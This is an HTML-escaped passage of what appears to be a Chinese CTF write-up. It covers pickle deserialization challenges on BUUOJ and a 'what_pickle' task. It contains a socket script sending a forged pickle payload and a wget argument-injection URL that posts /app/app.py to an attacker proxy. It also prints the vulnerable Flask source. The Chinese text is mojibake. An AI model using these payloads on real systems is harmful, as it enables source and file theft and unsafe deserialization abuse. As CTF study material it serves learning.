&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># ä¿®æ”¹win_count = 10å’Œround_count = 9ï¼Œä¼ è¿‡åŽ»ä¹‹åŽæ‰§è¡Œä¸€æ¬¡round_count += 1å°±èƒ½å…¨èƒœ&lt;/span>
&lt;span style="color:#111">cguess_name&lt;/span>
&lt;span style="color:#111">game&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#34;win_count&amp;#34;&lt;/span>
&lt;span style="color:#111">I10&lt;/span>
&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#34;round_count&amp;#34;&lt;/span>
&lt;span style="color:#111">I9&lt;/span>
&lt;span style="color:#111">sbcguess_game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Ticket&lt;/span>\&lt;span style="color:#111">nTicket&lt;/span>\&lt;span style="color:#111">nq&lt;/span>\&lt;span style="color:#111">x00&lt;/span>&lt;span style="color:#111">)&lt;/span>\&lt;span style="color:#111">x81q&lt;/span>\&lt;span style="color:#111">x01&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>\&lt;span style="color:#111">x02X&lt;/span>\&lt;span style="color:#111">x06&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00numberq&lt;/span>\&lt;span style="color:#111">x03K&lt;/span>\&lt;span style="color:#111">x06sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#75715e"># cä¹‹åŽæ˜¯è¢«find_class()ç›‘æŽ§çš„åŒºåŸŸï¼Œæ‹¼æŽ¥Ticket&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;node4.buuoj.cn&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">28803&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cguess_game
&lt;/span>&lt;span style="color:#d88200">game
&lt;/span>&lt;span style="color:#d88200">}S&amp;#34;win_count&amp;#34;
&lt;/span>&lt;span style="color:#d88200">I10
&lt;/span>&lt;span style="color:#d88200">sS&amp;#34;round_count&amp;#34;
&lt;/span>&lt;span style="color:#d88200">I9
&lt;/span>&lt;span style="color:#d88200">sbcguess_game.Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x06\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">numberq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">sb.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;I&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809144613834.png" alt="image-20210809144613834">&lt;/p>
&lt;p>â€”â€”â€”â€”ç”¨pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game.Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;span style="color:#75715e"># b&amp;#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&amp;#39;curr_ticket&amp;#39;\ng0\ndtbg0\n.&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­3 - [å·…å³°æžå®¢ 2021]what_pickle
&lt;/h4>
&lt;/summary>
&lt;p>ç™»å½•é¡µé¢ ä»»æ„å¯†ç å‡å¯ç™»å…¥ï¼Œä»…æ˜¾ç¤ºä¸€å¼ å›¾ç‰‡+ç™»å½•æ—¶è¾“å…¥çš„å¯†ç ï¼›å›¾ç‰‡çš„urlä¸º/images?image=2.jpgï¼Œä½†æ˜¯ä¸èƒ½å¸¸è§„çš„ç›®å½•ç©¿è¶Šæ‹¿æºç ï¼Œå½“æ—¶åšçš„æ—¶å€™å°±ä¸ä¼šäº†ï¼Œä¸‹é¢æ˜¯å¤çŽ°&lt;/p>
&lt;p>/imageså¯ä»¥çœ‹åˆ°å¼€ç€çš„debugç•Œé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png" alt="image-20211024174438862">&lt;/p>
&lt;p>èƒ½çœ‹åˆ°éƒ¨åˆ†çš„æºç ï¼Œè¿™é‡Œçš„å›¾ç‰‡æ˜¯ç”¨çš„wgetå‘½ä»¤æ¥ä¸‹è½½æœ¬åœ°8080ç«¯å£çš„/imageå›¾ç‰‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•wgetå‘½ä»¤æ³¨å…¥å°†æ–‡ä»¶å¤–å¸¦å‡ºæ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=--post-file=/app/app.py&amp;amp;argv=--execute=http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=â€”post-file=/app/app.py&amp;amp;argv=-e http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;p>ä¾æ¬¡è¯»å‡º/app/app.pyå’Œ/app/config.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># app.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">redirect&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">ctypes&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cdll&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">config&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">user&lt;/span>
&lt;span style="color:#111">cdll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">LoadLibrary&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./readflag.so&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;config&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/index&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/home&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">Jpg_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Jpg_id&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/images&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">images&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;wget&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getlist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">startswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#d88200">&amp;#39;--&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;image&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#34;-q&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-O&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8080/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stdout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stdout&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">debug&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
